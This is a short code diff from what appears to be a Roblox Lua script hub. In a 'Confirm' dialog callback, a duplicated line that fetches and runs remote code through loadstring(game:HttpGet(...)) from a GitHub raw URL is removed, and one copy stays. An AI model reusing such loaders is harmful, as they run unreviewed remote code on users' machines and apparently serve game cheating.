@@ -89,8 +89,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/Name
                         Title = "Confirm",
                         Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
-wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
                             print("Confirmed the dialog.")
                         end
                     },
